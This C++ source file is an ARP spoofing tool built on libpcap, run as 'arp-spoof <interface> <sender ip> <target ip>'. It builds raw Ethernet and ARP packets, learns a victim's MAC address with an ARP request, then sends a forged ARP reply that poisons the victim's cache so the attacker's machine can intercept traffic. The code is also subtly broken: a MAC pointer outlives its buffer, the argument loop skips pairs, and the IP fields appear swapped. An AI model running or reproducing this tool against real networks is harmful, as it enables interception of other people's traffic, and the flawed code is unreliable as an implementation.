#include <cstdio>
#include <pcap.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <cstdlib>
#include <sys/socket.h>
#include <unistd.h>
#include <cstring>

// Ethernet Header 14 bytes
typedef struct Ethernet_HDR {
	uint8_t ether_dst[6];
	uint8_t ether_src[6];
	uint16_t ether_type;
}EthHdr;

// ARP Header 28 bytes
typedef struct Arp_HDR {
	uint16_t hrd_type;
	uint16_t pro_type;
	uint8_t hrd_len;
	uint8_t pro_len;
	uint16_t operation; 		/* 1: Request, 2: Reply */
	uint8_t src_hdr_adr[6];		/* Source MAC */
	uint8_t src_pro_adr[4];		/* Source IP */
	uint8_t dst_hdr_adr[6]; 	/* Destination MAC */
	uint8_t dst_pro_adr[4];		/* Destination IP */
}ArpHdr;

typedef struct EthArpPacket {
	EthHdr eth;
	ArpHdr arp;
}EthernetArpPacket;

char* hostMAC;
char* senderMAC;
using namespace std;

void findMacAddr(char *interface) {
	int sock = socket(AF_INET, SOCK_DGRAM, 0);
	struct ifreq ifr;

	if (sock < 0) {
		printf("Socket ERROR");
		exit(1);
	}

	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);

    ioctl(sock, SIOCGIFHWADDR, &ifr);
	if(ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
		close(sock);
		printf("ioctl ERROR");
		exit(1);
	}

	close(sock);
	
    hostMAC = ifr.ifr_hwaddr.sa_data;
}

void sendARP(pcap_t *handle, uint32_t src_ip, uint32_t dst_ip, uint16_t operation) {

	EthernetArpPacket packet;

	/* Ethernet Header */
	if(operation == 1) {
		for (int i=0; i< 6; i++) {
			packet.eth.ether_dst[i] = 0xff;
		}
	} else if (operation == 2) {
	 	memcpy(packet.eth.ether_dst, senderMAC, 6);
	}
	memcpy(packet.eth.ether_src, hostMAC, 6);
	packet.eth.ether_type = htons(0x0806);

	/* Arp Header */
	packet.arp.hrd_type = htons(0x0001);
	packet.arp.pro_type = htons(0x0800);
 	packet.arp.hrd_len = 0x06;
	packet.arp.pro_len = 0x04;
 	packet.arp.operation = htons(operation);

	memcpy(packet.arp.src_hdr_adr, hostMAC, 6);
	memcpy(packet.arp.src_pro_adr, (char*)&dst_ip, 4);
	memcpy(packet.arp.dst_pro_adr, (char*)&src_ip, 4);

	if(operation == 1) {
		for (int i=0; i<6; i++) {
			packet.arp.dst_hdr_adr[i] = 0x00;
		}
	} else if (operation == 2) {
		memcpy((char*)(packet.arp.dst_hdr_adr), senderMAC, 6);
	}

    if (pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(packet)) == PCAP_ERROR) {
        fprintf(stderr, "Couldn't send packet\n");
		exit(1);
    }

}

void usage() {
	printf("arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]");
}

int main(int argc, char* argv[]) {
	if (argc % 2 != 0 || argc < 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

	bool flag = false;

	for(int i=0; i< (argc-2)/2; i += 2) {
		uint32_t sourceIP = inet_addr(argv[i+2]);
		uint32_t destinationIP = inet_addr(argv[i+3]);

		if (sourceIP == INADDR_NONE || destinationIP == INADDR_NONE) {
			printf("Invalid Address");
			return -1;
		}
		
		if (!flag) {
			findMacAddr(dev);
			flag = true;
		}

		sendARP(handle, sourceIP, destinationIP, 1);

		struct pcap_pkthdr* header;
        const u_char* packet;
		
		while (true) {
			int res = pcap_next_ex(handle, &header, &packet);
			
			if (res == 0) continue;

			if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
				printf("pcap_next_ex return %d(%s) \n", res, pcap_geterr(handle));
				return -1;
			}

			EthHdr *eth = (EthHdr*)packet;
			if (ntohs(eth -> ether_type) != 0x0806 || !strncmp((char*)(eth -> ether_dst), hostMAC, 6))
				continue;

			ArpHdr *arp = (ArpHdr*)(packet + 14);
			senderMAC = (char *)(arp -> src_hdr_adr);

			break;
		}
		
		sendARP(handle, sourceIP, destinationIP, 2);
	}
	return 0;
}


